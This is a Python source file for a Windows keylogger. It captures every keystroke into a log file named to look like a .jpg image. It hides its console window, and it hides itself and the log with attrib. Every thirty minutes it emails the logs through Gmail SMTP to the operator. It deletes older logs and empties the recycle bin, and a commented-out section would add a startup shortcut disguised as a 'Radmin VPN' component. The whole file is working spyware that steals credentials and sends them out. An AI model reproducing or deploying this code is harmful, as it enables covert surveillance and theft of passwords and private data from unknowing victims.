import threading
import time
# Keylogger libraries #
from pynput import keyboard
import logging
import ctypes
from datetime import datetime, timedelta
# Keylogger libraries #
# Email libraries #
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
# Email libraries #
# Shortcut libraries #
import os
import sys
import winshell
# Shortcut libraries #
# Hiding libraries #
import subprocess
# Hiding libraries #

# Threads lock #
threadsLock = threading.Lock()
# Threads lock #
# Shortcut stuff #
"""
#print("im making the shortcut...")
pathToSelf = sys.argv[0]
dirSelf = pathToSelf
i = len(dirSelf) - 1
for char in dirSelf[::-1]:
    dirSelf = dirSelf[:i] + dirSelf[(i + 1):]
    if char == '/':
        break
    i -= 1

startup = winshell.startup()
path = os.path.join(startup, "Radmin VPN_guard.lnk")
target = pathToSelf
wDir = dirSelf
icon = pathToSelf

shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()
#print("im making the shortcut success...")
"""
# Shortcut stuff #
# Keylogger stuff #
today = datetime.today()
daysAgo = []
daysAgo.append(today - timedelta(days=1))
daysAgo.append(today - timedelta(days=2))
daysAgo.append(today - timedelta(days=3))
daysAgo.append(today - timedelta(days=4))
daysAgo.append(today - timedelta(days=5))
daysAgo.append(today - timedelta(days=6))

logsFileName = today.strftime("%d_%m_%Y")+".jpg"
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
logging.basicConfig(filename=logsFileName, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    with threadsLock:
        logging.info(str(key))
        #print(key)

kListener = keyboard.Listener(on_press=on_press)
kListener.start()
# Keylogger stuff #
# Hiding stuff #
CREATE_NO_WINDOW = 0x08000000
#subprocess.call("attrib +h " + "\"" + path + "\"", creationflags=CREATE_NO_WINDOW)
subprocess.call("attrib +h " + "\"" + sys.argv[0] + "\"", creationflags=CREATE_NO_WINDOW)
subprocess.call("attrib +h " + "\"" + logsFileName + "\"", creationflags=CREATE_NO_WINDOW)
# Hiding stuff #
# Mailing stuff #
def emailThreadJob():
    #print("emailThreadJob starts...")
    email_user = "testprogramming43@gmail.com"
    email_send = "email_address"
    email_password = "email_password"

    #print("wchodze petla testowa")
    for i in range(6):
        try:
            #print("try {}".format(i))
            subject = "newLogsException"
            msg = MIMEMultipart()
            msg['From'] = email_user
            msg['To'] = email_send
            msg['Subject'] = subject
            body = "newLogsException"
            msg.attach(MIMEText(body, "plain"))

            with threadsLock:
                filename = daysAgo[i].strftime("%d_%m_%Y")+".jpg"
                attachment = open(filename, "rb")

                part = MIMEBase("application(", "octet-stream")
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", "attachment; filename= " + filename)

                msg.attach(part)
                attachment.close()
            text = msg.as_string()

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_user, email_password)

            server.sendmail(email_user, email_send, text)
            server.quit()
            with threadsLock:
                os.remove(filename)
                #print("usuniety {}".format(i))
        except IOError:
            pass
            #print("file {} doesn't exist".format(i))
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except:
        pass
        #print("kosz pusty except")
    while True:
        #print("im sending the email...")
        subject = "newLogs"
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject
        body = "newLogs"
        msg.attach(MIMEText(body, "plain"))

        with threadsLock:
            filename = logsFileName
            attachment = open(filename, "rb")

            part = MIMEBase("application(", "octet-stream")
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", "attachment; filename= "+filename)

            msg.attach(part)
            attachment.close()
        text = msg.as_string()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_user, email_password)

        server.sendmail(email_user, email_send, text)
        server.quit()
        #print("...email sended! done")
        for i in range(1800):
            time.sleep(1)
            #print("...waiting {}seconds until email sending...".format(i))
emailThread = threading.Thread(target=emailThreadJob)
emailThread.daemon = True
emailThread.start()
# Mailing stuff #
# Threads joins #
emailThread.join()
kListener.join()
# Threads joins #